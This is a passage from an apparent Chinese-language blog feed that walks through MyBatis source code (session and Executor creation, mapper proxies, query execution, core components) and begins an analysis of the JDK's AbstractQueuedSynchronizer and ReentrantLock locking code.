operator">=</span> configuration<span class="token punctuation">.</span><span class="token function">getEnvironment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">final</span> <span class="token class-name">TransactionFactory</span> transactionFactory <span class="token operator">=</span> <span class="token function">getTransactionFactoryFromEnvironment</span><span class="token punctuation">(</span>environment<span class="token punctuation">)</span><span class="token punctuation">;</span>    tx <span class="token operator">=</span> transactionFactory<span class="token punctuation">.</span><span class="token function">newTransaction</span><span class="token punctuation">(</span>environment<span class="token punctuation">.</span><span class="token function">getDataSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> level<span class="token punctuation">,</span> autoCommit<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">//这里去创建Executor</span>    <span class="token keyword">final</span> <span class="token class-name">Executor</span> executor <span class="token operator">=</span> configuration<span class="token punctuation">.</span><span class="token function">newExecutor</span><span class="token punctuation">(</span>tx<span class="token punctuation">,</span> execType<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">DefaultSqlSession</span><span class="token punctuation">(</span>configuration<span class="token punctuation">,</span> executor<span class="token punctuation">,</span> autoCommit<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">closeTransaction</span><span class="token punctuation">(</span>tx<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// may have fetched a connection so lets call close()</span>    <span class="token keyword">throw</span> <span class="token class-name">ExceptionFactory</span><span class="token punctuation">.</span><span class="token function">wrapException</span><span class="token punctuation">(</span><span class="token string">"Error opening session.  Cause: "</span> <span class="token operator">+</span> e<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">ErrorContext</span><span class="token punctuation">.</span><span class="token function">instance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">reset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>创建Executor代码逻辑</p><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">Executor</span> <span class="token function">newExecutor</span><span class="token punctuation">(</span><span class="token class-name">Transaction</span> transaction<span class="token punctuation">,</span> <span class="token class-name">ExecutorType</span> executorType<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  executorType <span class="token operator">=</span> executorType <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">?</span> defaultExecutorType <span class="token operator">:</span> executorType<span class="token punctuation">;</span>  executorType <span class="token operator">=</span> executorType <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token class-name">ExecutorType</span><span class="token punctuation">.</span><span class="token constant">SIMPLE</span> <span class="token operator">:</span> executorType<span class="token punctuation">;</span>  <span class="token class-name">Executor</span> executor<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">ExecutorType</span><span class="token punctuation">.</span><span class="token constant">BATCH</span> <span class="token operator">==</span> executorType<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    executor <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BatchExecutor</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> transaction<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">ExecutorType</span><span class="token punctuation">.</span><span class="token constant">REUSE</span> <span class="token operator">==</span> executorType<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    executor <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReuseExecutor</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> transaction<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    executor <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SimpleExecutor</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> transaction<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>cacheEnabled<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    executor <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CachingExecutor</span><span class="token punctuation">(</span>executor<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  executor <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Executor</span><span class="token punctuation">)</span> interceptorChain<span class="token punctuation">.</span><span class="token function">pluginAll</span><span class="token punctuation">(</span>executor<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> executor<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h3 id="获取Mapper的代理对象（MapperProxy）的过程"><a href="#获取Mapper的代理对象（MapperProxy）的过程" class="headerlink" title="获取Mapper的代理对象（MapperProxy）的过程"></a>获取Mapper的代理对象（MapperProxy）的过程</h3><ol><li>调用<code>DefaultSqlSession</code>对象的getMapper(type)方法。（type是Mapper接口的class，例如XXXMapper.class）</li><li>进一步里面会调用<code>configuration</code>.getMapper(type,sqlSession),调用<code>configuration</code>对象中<code>mapperRegistry</code>的getMapper</li><li>然后根据class类型获取<code>MapperProxyFactory</code>，调用其<code>newInstance</code>，进而使用<code>MapperProxy</code>动态代理创建代理对象，并返回</li></ol><h3 id="执行增删改查方法的过程"><a href="#执行增删改查方法的过程" class="headerlink" title="执行增删改查方法的过程"></a>执行增删改查方法的过程</h3><ol><li><p><code>Mapper</code>都是接口，所以最终执行都会执行到<code>MapperProxy</code>的<code>invoke</code>方法</p></li><li><p><code>MapperProxy</code>的invoke会执行<code>MapperMethod</code>的execute，execute方法会判断当前要执行的sql语句的类型</p></li><li><p>当前是selectAll，于是执行到<code>executeForMany</code>方法，进而<code>sqlSession</code>执行到selectList方法</p></li><li><p>selectList方法中获取<code>MappedStatement</code>对象，调用<code>executor</code>(CachingExecutor)执行query</p></li><li><p>获取BoundSql对象，里面包含sql语句的详细信息。sql语句是什么、sql语句的参数是什么等详细信息</p></li><li><p>调用真正的<code>simpleExecutor</code>的query方法进行查询，query是<code>BaseExecutor</code>中的，真正执行到doQuery方法</p></li><li><p>doQuery里面会创建<code>StatementHandler</code>，默认就是<code>PreparedStatementHandler</code>。<code>StatementHandler</code>被用于创建Statement对象。同时这里<code>StatementHandler</code>会执行interceptorChain的pluginAll进行插件加载</p></li><li><p>在<code>StatementHandler</code>会调用父类<code>BaseStatementHandler</code>的构造方法进一步创建<code>ParameterHandler</code>和<code>ResultSetHandler</code></p><ol><li><code>ParameterHandler</code>用于处理参数设置的 ，设置sql语句的预编译参数</li><li><code>ResultSetHandler</code>用于处理结果返回封装的</li></ol></li><li><p><code>ParameterHandler</code>和<code>ResultsetHandler</code>都会借助<code>TypeHandler</code>来进行数据库类型和Java Bean类型的转换</p></li><li><p><code>ParameterHandler</code>设置参数的时候是调用的<code>TypeHandler</code>给sql预编译设置参数</p></li><li><p>查出数据之后，使用<code>ResultHandler</code>处理结果，里面也是使用<code>TypeHandler</code>包装value值</p></li><li><p>后续操作完成数据库连接相关</p></li><li><p>流程结束</p></li></ol><blockquote><p><strong>Executor、ParameterHandler、ResultsetHandler、TypeHandler四大对象</strong>之间的关系</p><p>Executor用于执行增删改查操作；StatementHandler用ParameterHandler设置参数；使用ResultsetHandler处理结果；过程中又采用TypeHandler来实现数据库类型和JavaBean类型之间的转换</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>Mybatis源码</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>剑指源码-Mybatis-(一)-序章</title>
    <link href="/posts/2569fe28.html"/>
    <url>/posts/2569fe28.html</url>
    
    <content type="html"><![CDATA[<p> Mybatis介绍，起源。常见的ORM框架，为什么选择Mybatis，搭建Mybatis源码环境条件</p><span id="more"></span><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><blockquote><p>MyBatis 是 Java 生态中非常著名的一款 ORM 框架</p></blockquote><h2 id="JDBC流程"><a href="#JDBC流程" class="headerlink" title="JDBC流程"></a>JDBC流程</h2><p><code>Java DataBase Connectivity</code>  Java 程序与关系型数据库交互的统一 API</p><p>JDBC 由两部分 API 构成：第一部分是面向 Java 开发者的 Java API，它是一个统一的、标准的 Java API，独立于各个数据库产品的接口规范；第二部分是面向数据库驱动程序开发者的 API，它是由各个数据库厂家提供的数据库驱动，是第一部分接口规范的底层实现，用于连接具体的数据库产品</p><h3 id="JDBC-操作的核心步骤"><a href="#JDBC-操作的核心步骤" class="headerlink" title="JDBC 操作的核心步骤"></a>JDBC 操作的核心步骤</h3><ol><li>注册数据库驱动类，指定数据库地址，其中包括 DB 的用户名、密码及其他连接信息</li><li>调用 DriverManager.getConnection() 方法创建 Connection 连接到数据库</li><li>调用 Connection 的 createStatement() 或 prepareStatement() 方法，创建 Statement 对象，此时会指定 SQL（或是 SQL 语句模板 + SQL 参数）</li><li>通过 Statement 对象执行 SQL 语句，得到 ResultSet 对象，也就是查询结果集</li><li>遍历 ResultSet，从结果集中读取数据，并将每一行数据库记录转换成一个 JavaBean 对象</li><li>关闭 ResultSet 结果集、Statement 对象及数据库 Connection，从而释放这些对象占用的底层资源</li></ol><h2 id="常见ORM框架对比"><a href="#常见ORM框架对比" class="headerlink" title="常见ORM框架对比"></a>常见ORM框架对比</h2><h3 id="Hibernate"><a href="#Hibernate" class="headerlink" title="Hibernate"></a>Hibernate</h3><p>Hibernate 是 Java 生态中著名的 ORM 框架之一。Hibernate 现在也在扩展自己的生态，开始支持多种异构数据的持久化，不仅仅提供 ORM 框架，还提供了 Hibernate Search 来支持全文搜索，提供 validation 来进行数据校验，提供 Hibernate OGM 来支持 NoSQL 解决方案。</p><h3 id="Spring-Data-JPA"><a href="#Spring-Data-JPA" class="headerlink" title="Spring Data JPA"></a>Spring Data JPA</h3><blockquote><p>Spring Data JPA 是符合 JPA 规范的一个 Repository 层的实现</p></blockquote><p>JPA 是在 JDK 5.0 后提出的 Java 持久化规范（JSR 338）。JPA 规范本身是为了整合市面上已有的 ORM 框架，结束 Hibernate、EclipseLink、JDO 等 ORM 框架各自为战的割裂局面，简化 Java 持久层开发</p><p>JPA 有三个核心部分：<strong>ORM 映射元数据</strong>、<strong>操作实体对象 API</strong> 和<strong>面向对象的查询语言（JPQL）</strong></p><h3 id="Mybatis"><a href="#Mybatis" class="headerlink" title="Mybatis"></a>Mybatis</h3><p>优点：MyBatis 相较于 Hibernate 和各类 JPA 实现框架更加灵活、更加轻量级、更加可控。</p><p>我们可以在 MyBatis 的 Mapper 映射文件中，直接编写原生的 SQL 语句，应用底层数据库产品的方言，这就给了我们直接优化 SQL 语句的机会。我们还可以按照数据库的使用规则，让原生 SQL 语句选择我们期望的索引，从而保证服务的性能。</p><p>在编写原生 SQL 语句时，我们也能够更加方便地控制结果集中的列，而不是查询所有列并映射对象后返回，这在列比较多的时候也能起到一定的优化效果</p><p>缺点：sql 需要更加仔细的调试</p><h2 id="选择Mybatis源码阅读原因"><a href="#选择Mybatis源码阅读原因" class="headerlink" title="选择Mybatis源码阅读原因"></a>选择Mybatis源码阅读原因</h2><ul><li>MyBatis 本身就是一款设计非常精良、架构设计非常清晰的持久层框架，并且 MyBatis 中还使用到了很多经典的设计模式，例如，工厂方法模式、适配器模式、装饰器模式、代理模式等。</li><li>MyBatis 提供了很多扩展点，例如，MyBatis 的插件机制、对第三方日志框架和第三方数据源的兼容等</li><li>开发人员使用 MyBatis 上手会非常快，具有很强的易用性和可靠性</li></ul><h2 id="源码搭建"><a href="#源码搭建" class="headerlink" title="源码搭建"></a>源码搭建</h2><p>下载源代码 git clone  <a href="https://github.com/mybatis/mybatis-3.git">https://github.com/mybatis/mybatis-3.git</a></p><p>从标签版本切换分支出来 <code>git branch mybatis3 mybatis-3.5.9</code></p><h3 id="Mybatis-架构简介"><a href="#Mybatis-架构简介" class="headerlink" title="Mybatis 架构简介"></a>Mybatis 架构简介</h3><p><img src="http://hyqup-blog-upyun.test.upcdn.net/img/webp.webp" alt="img"></p><center>图片来自网络</center><ol><li>API接口层</li><li>数据处理层</li><li>基础支撑层</li></ol><h4 id="接口层"><a href="#接口层" class="headerlink" title="接口层"></a>接口层</h4><blockquote><p>提供给外部使用的接口API，开发人员通过这些本地API来操纵数据库</p></blockquote><p> MyBatis 会根据接口声明的方法信息，通过<strong>动态代理机制生成一个Mapper 实例</strong>，当调用接口方法时，根据这个方法的方法名和参数类型，确定Statement Id，底层还是通过 SqlSession.select&#x2F;update( “statementId”, parameter) 等来实现对数据库的操作</p><h3 id="数据处理层"><a href="#数据处理层" class="headerlink" title="数据处理层"></a>数据处理层</h3><blockquote><p>MyBatis 的核心，负责具体的SQL查找、SQL解析、SQL执行和执行结果映射处理等，它主要的目的是根据调用的请求完成一次数据库操作</p></blockquote><p>主要功能</p><ul><li>通过传入参数构建动态SQL语句</li><li>SQL语句的执行以及封装查询结果集</li></ul><h3 id="基础支撑层"><a href="#基础支撑层" class="headerlink" title="基础支撑层"></a>基础支撑层</h3><p>基础支撑层是整个MyBatis框架的地基，负责最基础的功能支撑，共有九大基础工具</p><p><img src="http://hyqup-blog-upyun.test.upcdn.net/img/1460000041398816.png" alt=" title="></p><center>图片来自网络</center><h2 id="核心组件"><a href="#核心组件" class="headerlink" title="核心组件"></a>核心组件</h2><p><code>SqlSession</code> 作为MyBatis工作的主要顶层API，表示和数据库交互的会话，完成必要数据库增删改查功能</p><p><code>Executor</code> MyBatis执行器，是MyBatis 调度的核心，负责SQL语句的生成和查询缓存的维护</p><p><code>StatementHandler</code> 封装了JDBC Statement操作，负责对JDBC statement 的操作，如设置参数、将Statement结果集转换成List集合。</p><p><code>ParameterHandler</code> 负责对用户传递的参数转换成JDBC Statement 所需要的参数，</p><p><code>ResultSetHandler</code> 负责将JDBC返回的ResultSet结果集对象转换成List类型的集合；</p><p><code>TypeHandler</code> 负责java数据类型和jdbc数据类型之间的映射和转换</p><p><code>MappedStatement</code> MappedStatement维护了一条<code>&lt;select|update|delete|insert&gt;</code>节点的封装，</p><p><code>SqlSource</code> 负责根据用户传递的parameterObject，动态地生成SQL语句，将信息封装到BoundSql对象中，并返回</p><p><code>BoundSql</code> 表示动态生成的SQL语句以及相应的参数信息</p><p><code>Configuration</code> MyBatis所有的配置信息都维持在Configuration对象之中。</p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>Mybatis源码</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>JUC(八)-AbstractQueuedSynchronizer之AQS</title>
    <link href="/posts/e0cf2292.html"/>
    <url>/posts/e0cf2292.html</url>
    
    <content type="html"><![CDATA[<p><code>AQS</code>即是抽象的队列式的同步器，熟知的<code>ReentrantLock</code>、<code>ReentrantReadWriteLock</code>、<code>CountDownLatch</code>、<code>Semaphore</code>等都是基于<code>AQS</code>来实现的。</p><span id="more"></span><h2 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h2><blockquote><p>是用来构建锁或者其它同步器组件的重量级基础框架及整个JUC体系的基石，通过内置的FIFO队列来完成资源获取线程的排队工作，并通过一个int类变量表示持有锁的状态</p></blockquote><p><img src="http://hyqup-blog-upyun.test.upcdn.net/img/171d2d42c77b2765tplv-t2oaga2asx-image.image" alt="image.png"></p><center>图片来自网络</center><p>CLH:Craig、Landin and Hagersten 队列，是一个单向链表，AQS中的队列是CLH变体的虚拟双向队列FIFO</p><p><code>AQS</code>中 维护了一个<code>volatile int state</code>（代表共享资源）和一个<code>FIFO</code>线程等待队列（多线程争用资源被阻塞时会进入此队列）</p><p>这里<code>volatile</code>能够保证多线程下的可见性，当<code>state=1</code>则代表当前对象锁已经被占有，其他线程来加锁时则会失败，加锁失败的线程会被放入一个<code>FIFO</code>的等待队列中，比列会被<code>UNSAFE.park()</code>操作挂起，等待其他获取锁的线程释放锁才能够被唤醒</p><p>另外<code>state</code>的操作都是通过<code>CAS</code>来保证其并发修改的安全性</p><p>AQS的基本API</p><ul><li>getState()：获取锁的标志state值</li><li>setState()：设置锁的标志state值</li><li>tryAcquire(int)：独占方式获取锁。尝试获取资源，成功则返回true，失败则返回false</li><li>tryRelease(int)：独占方式释放锁。尝试释放资源，成功则返回true，失败则返回false</li></ul><h2 id="AQS源码"><a href="#AQS源码" class="headerlink" title="AQS源码"></a>AQS源码</h2><p>以<strong>ReentrantLock</strong>为例，加锁过程</p><p>1、尝试加锁</p><p>2、加锁失败，线程放入队列</p><p>3、线程入队列后，进入阻塞状态</p><h3 id="非公平锁NonfairSync为例，案例都是理想正常流程执行-A-B-C-线程执行，实际上有差异"><a href="#非公平锁NonfairSync为例，案例都是理想正常流程执行-A-B-C-线程执行，实际上有差异" class="headerlink" title="非公平锁NonfairSync为例，案例都是理想正常流程执行 A-B-C 线程执行，实际上有差异"></a>非公平锁NonfairSync为例，案例都是理想正常流程执行 A-B-C 线程执行，实际上有差异</h3><h3 id="Lock方法（挂起线程）"><a href="#Lock方法（挂起线程）" class="headerlink" title="Lock方法（挂起线程）"></a>Lock方法（挂起线程）</h3><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">class</span> <span class="token class-name">NonfairSync</span> <span class="token keyword">extends</span> <span class="token class-name">Sync</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">long</span> serialVersionUID <span class="token operator">=</span> <span class="token number">7316153563782823691L</span><span class="token punctuation">;</span>    <span class="token comment">/**     * Performs lock.  Try immediate barge, backing up to normal     * acquire on failure.     */</span>    <span class="token keyword">final</span> <span class="token keyword">void</span> <span class="token function">lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">compareAndSetState</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token function">setExclusiveOwnerThread</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">else</span>            <span class="token function">acquire</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">protected</span> <span class="token keyword">final</span> <span class="token keyword">boolean</span> <span class="token function">tryAcquire</span><span class="token punctuation">(</span><span class="token keyword">int</span> acquires<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">nonfairTryAcquire</span><span class="token punctuation">(</span>acquires<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p><code>compareAndSetState</code> 比较state，这里A先进入比较并交换 设置<code>state</code>0到1，<code>AQS</code>实现，</p><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">final</span> <span class="token keyword">boolean</span> <span class="token function">compareAndSetState</span><span class="token punctuation">(</span><span class="token keyword">int</span> expect<span class="token punctuation">,</span> <span class="token keyword">int</span> update<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> unsafe<span class="token punctuation">.</span><span class="token function">compareAndSwapInt</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> stateOffset<span class="token punctuation">,</span> expect<span class="token punctuation">,</span> update<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">protected</span> <span class="token keyword">final</span> <span class="token keyword">void</span> <span class="token function">setExclusiveOwnerThread</span><span class="token punctuation">(</span><span class="token class-name">Thread</span> thread<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    exclusiveOwnerThread <span class="token operator">=</span> thread<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>此时B线程执行<code>lock</code>开始抢占锁，此时非常抱歉，此时<code>state=1</code>,那么B只能进入<code>acquire</code>方法</p><p>模板方法进入<code>AbstractQueuedSynchronizer</code>的acquire方法，注意：tryAcquire 方法AbstractQueuedSynchronizer本身不实现，会抛出UnsupportedOperationException异常</p><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">void</span> <span class="token function">acquire</span><span class="token punctuation">(</span><span class="token keyword">int</span> arg<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">tryAcquire</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>        <span class="token function">acquireQueued</span><span class="token punctuation">(</span><span class="token function">addWaiter</span><span class="token punctuation">(</span><span class="token class-name">Node</span><span class="token punctuation">.</span><span class="token constant">EXCLUSIVE</span><span class="token punctuation">)</span><span class="token punctuation">,</span> arg<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token function">selfInterrupt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>而非公平NonfairSync里面的实现 </p><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">final</span> <span class="token keyword">boolean</span> <span class="token function">tryAcquire</span><span class="token punctuation">(</span><span class="token keyword">int</span> acquires<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">nonfairTryAcquire</span><span class="token punctuation">(</span>acquires<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></figure><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">final</span> <span class="token keyword">boolean</span> <span class="token function">nonfairTryAcquire</span><span class="token punctuation">(</span><span class="token keyword">int</span> acquires<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">final</span> <span class="token class-name">Thread</span> current <span class="token operator">=</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token function">getState</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">compareAndSetState</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> acquires<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">setExclusiveOwnerThread</span><span class="token punctuation">(</span>current<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>current <span class="token operator">==</span> <span class="token function">getExclusiveOwnerThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> nextc <span class="token operator">=</span> c <span class="token operator">+</span> acquires<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>nextc <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">// overflow</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">"Maximum lock count exceeded"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setState</span><span class="token punctuation">(</span>nextc<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>由于此时C&#x3D;1,并且getExclusiveOwnerThread&#x3D;A ,所以此时返回false</p><p>接下来执行父类模板定义的方法</p><p> acquireQueued(addWaiter(Node.EXCLUSIVE), arg)</p><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token class-name">Node</span> <span class="token function">addWaiter</span><span class="token punctuation">(</span><span class="token class-name">Node</span> mode<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">Node</span> node <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Node</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> mode<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// Try the fast path of enq; backup to full enq on failure</span>    <span class="token class-name">Node</span> pred <span class="token operator">=</span> tail<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>pred <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        node<span class="token punctuation">.</span>prev <span class="token operator">=</span> pred<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">compareAndSetTail</span><span class="token punctuation">(</span>pred<span class="token punctuation">,</span> node<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            pred<span class="token punctuation">.</span>next <span class="token operator">=</span> node<span class="token punctuation">;</span>            <span class="token keyword">return</span> node<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">enq</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> node<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token class-name">Node</span> <span class="token function">enq</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">Node</span> node<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Node</span> t <span class="token operator">=</span> tail<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>t <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// Must initialize</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">compareAndSetHead</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Node</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                tail <span class="token operator">=</span> head<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            node<span class="token punctuation">.</span>prev <span class="token operator">=</span> t<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">compareAndSetTail</span><span class="token punctuation">(</span>t<span class="token punctuation">,</span> node<span class="token punctuation">)</span><span class="token 